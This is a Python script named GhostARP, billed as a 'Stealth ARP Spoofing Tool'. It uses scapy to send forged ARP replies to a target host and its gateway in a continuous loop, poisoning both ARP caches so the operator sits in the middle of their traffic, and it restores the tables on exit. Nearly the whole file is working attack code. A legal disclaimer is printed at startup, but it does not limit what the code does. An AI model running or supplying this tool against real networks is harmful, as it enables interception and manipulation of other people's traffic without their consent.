import scapy.all as scapy
import time
import re
from colorama import init, Fore, Style

# Initialize Colorama
init()

# Banner with Coordinated Bright Colors
banner = f"""
{Style.BRIGHT}{Fore.RED}                   ________.__                    __     _____ ____________________ 
{Style.BRIGHT}{Fore.BLUE}                  /  _____/|  |__   ____  _______/  |_  /  _  \\______   \\______   \\
{Style.BRIGHT}{Fore.GREEN}                 /   \\  ___|  |  \\ /  _ \\/  ___/\\   __\\/  /_\\  \\|       _/|     ___/
{Style.BRIGHT}{Fore.YELLOW}                 \\    \\_\\  \\   Y  (  <_> )___ \\  |  | /    |    \\    |   \\|    |    
{Style.BRIGHT}{Fore.RED}                  \\______  /___|  /\\____/____  > |__| \\____|__  /____|_  /|____|    
{Style.BRIGHT}{Fore.RED}                         \\/     \\/           \\/               \\/       \\/                    
{Style.BRIGHT}{Fore.CYAN}                                ---- Stealth ARP Spoofing Tool ----
{Style.BRIGHT}{Fore.YELLOW}                 ===================================================================
{Style.BRIGHT}{Fore.YELLOW}                                𝕍𝕖𝕣𝕤𝕚𝕠𝕟 : 1.0     𝕋𝕨𝕚𝕥𝕥𝕖𝕣 : anishalx7        
{Style.BRIGHT}{Fore.YELLOW}                 ===================================================================    
{Style.RESET_ALL}
"""
LEGAL_DISCLAIMER = "\n[!] Legal disclaimer: Usage of GhostARP for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program."

def print_colored_disclaimer():
    print(f"{Style.BRIGHT}{Fore.WHITE}{LEGAL_DISCLAIMER}{Style.RESET_ALL}")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if not answered_list:
        print(f"[!] Error: No response for IP {ip}. Ensure the IP is valid and the target is on the network.")
        return None

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        return  # Exit if target MAC address could not be obtained
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    if destination_mac is None:
        return  # Exit if destination MAC address could not be obtained
    source_mac = get_mac(source_ip)
    if source_mac is None:
        return  # Exit if source MAC address could not be obtained
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def is_valid_ip(ip):
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return re.match(pattern, ip) is not None

def main():
    print(banner)  # Print the banner
    print_colored_disclaimer()  # Print the legal disclaimer

    # Ask the user for target and gateway IPs with validation
    while True:
        try:
            target_ip = input("Enter Target IP: ")
            if not is_valid_ip(target_ip):
                print(f"[!] Invalid IP address: {target_ip}. Please enter a valid IPv4 address.")
                continue
            
            gateway_ip = input("Enter Gateway IP: ")
            if not is_valid_ip(gateway_ip):
                print(f"[!] Invalid IP address: {gateway_ip}. Please enter a valid IPv4 address.")
                continue

            break  # Exit the loop if both IPs are valid
        except KeyboardInterrupt:
            print("\n[!] Script interrupted by user. Exiting gracefully.")
            return

    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print("\r[+] Packets sent: " + str(sent_packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected Ctrl + C ....... Resetting ARP tables... Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] ARP tables restored. Exiting.")

if __name__ == "__main__":
    main()
